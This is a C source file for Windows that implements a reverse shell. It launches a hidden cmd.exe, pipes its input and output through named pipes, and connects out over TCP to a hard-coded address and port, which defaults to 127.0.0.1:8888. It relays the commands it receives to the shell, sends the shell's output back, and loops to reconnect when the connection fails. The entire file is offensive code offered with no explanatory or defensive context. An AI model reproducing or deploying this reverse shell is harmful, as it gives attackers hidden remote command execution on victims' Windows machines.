#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "8888"
#define DEFAULT_IP "127.0.0.1"

#include <windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

int main();

typedef struct Pipe0
{
    HANDLE hs[4], evs[2], procH;
    int bufsize;
} * Pipe;
Pipe pipe;

char OUTPUT_text[4096];
DWORD OUTPUT_size;

static Pipe create_pipes()
{
    TCHAR PipeNameBuffer[MAX_PATH];
    long i;
    PTSTR IO = "IO";
    DWORD open_modes[] = {PIPE_ACCESS_INBOUND, PIPE_ACCESS_OUTBOUND};
    DWORD access[] = {GENERIC_WRITE, GENERIC_READ};
    DWORD nSize = 4096;
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), 0, 1};

    for (i = 0; i < 4; i++)
    {
        pipe->hs[i] = pipe->procH = INVALID_HANDLE_VALUE;
    }
    pipe->bufsize = 0;
    for (i = 0; i < 2; i++)
    {
        sprintf(PipeNameBuffer, "\\\\.\\pipe\\%c%08x", IO[i], GetCurrentProcessId());
        pipe->hs[i * 2] = CreateNamedPipe(PipeNameBuffer, open_modes[i] | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 1, nSize, nSize, 120 * 1000, 0);
        SetHandleInformation(pipe->hs[i * 2], HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
        pipe->hs[i * 2 + 1] = CreateFile(PipeNameBuffer, access[i], 0, 0, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
    }
    for (i = 0; i < 2; i++)
    {
        pipe->evs[i] = CreateEvent(0, 1, 1, 0);
    }

    return (pipe);
}

SECURITY_ATTRIBUTES sa;
STARTUPINFO si;
PROCESS_INFORMATION pi;
#define snewn(n, t) (t *)malloc(n * sizeof(t))
static const PTSTR pipe_init()
{
    PTSTR cmd = strdup("c:\\Windows\\system32\\cmd.exe");
    const int sz = 999;
    PTSTR s = snewn(sz, TCHAR), buf = snewn(sz, TCHAR);
    pipe = snewn(1, struct Pipe0);

    create_pipes();

    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    si.cb = sizeof(si);
    si.lpReserved = NULL;
    si.lpDesktop = NULL;
    si.lpTitle = NULL;
    si.dwFlags = STARTF_USESTDHANDLES;
    si.cbReserved2 = 0;
    si.lpReserved2 = NULL;
    si.hStdInput = pipe->hs[0];
    si.hStdOutput = pipe->hs[2];
    si.hStdError = pipe->hs[2];
    DWORD dw, ew, n, i = 0;

    CreateProcess(NULL, cmd, &sa, NULL, TRUE, CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);

    return NULL;
}

int exitwithchild()
{
    DWORD dw, ew;
    if ((dw = GetExitCodeProcess(pi.hProcess, &ew)) && ew != STILL_ACTIVE)
    {
        exit(ew);
    }
    return 0;
}

int frompipe(HANDLE in, HANDLE ou)
{
    static HANDLE revent = 0;
    OVERLAPPED ol = {0};
    if (!revent)
    {
        revent = CreateEvent(0, 0, 0, 0);
    }
    ol.hEvent = revent;
    DWORD dw, r, rf, q;
    char b[4096];
    DWORD read = 0;
    for (;;)
    {
        Sleep(300);
        if (rf = ReadFile(in, b, sizeof(b), &r, &ol))
        {
            OUTPUT_size = r;
            strncpy(OUTPUT_text, b, r);
            if (!r)
                return -1;
        }
        exitwithchild();
        return r;
    }
}

int init_socket(LPVOID lpParam)
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    iResult = getaddrinfo(DEFAULT_IP, DEFAULT_PORT, &hints, &result);

    for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
    {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR)
        {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            main();
        }
        break;
    }
    freeaddrinfo(result);

    DWORD rf;
    char s[1000], *t;
    if (t = (char *)pipe_init())
        return printf(t);
    char c = ' ';
    DWORD q, r, dw, ew;

    int sended = 0;
    for (;;)
    {
        Sleep(300);
        if (!sended)
        {
            frompipe(pipe->hs[3], NULL);
            if (OUTPUT_size > 0)
            {
                send(ConnectSocket, OUTPUT_text, 4096, 0);
            }
            memset(OUTPUT_text, 0, 4096);
            sended = 1;
        }
        else
        {
            iResult = recv(ConnectSocket, s, recvbuflen, 0);
            if (iResult == SOCKET_ERROR)
            {
                closesocket(ConnectSocket);
                ConnectSocket = INVALID_SOCKET;
                for (int h = 0; h < 4; h++)
                {
                    CloseHandle(pipe->hs[h]);
                }
            }
            if (iResult)
            {
                WriteFile(pipe->hs[1], s, strlen(s), NULL, 0);
                memset(s, 0, 1000);
                s[0] = '\0';
                sended = 0;
            }
        }
    }
    closesocket(ConnectSocket);
    WSACleanup();
}

int main()
{
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)init_socket, NULL, 0, NULL);
    int a = 0;
    for (;;)
    {
        scanf("%d", &a);
    }
    return 0;
}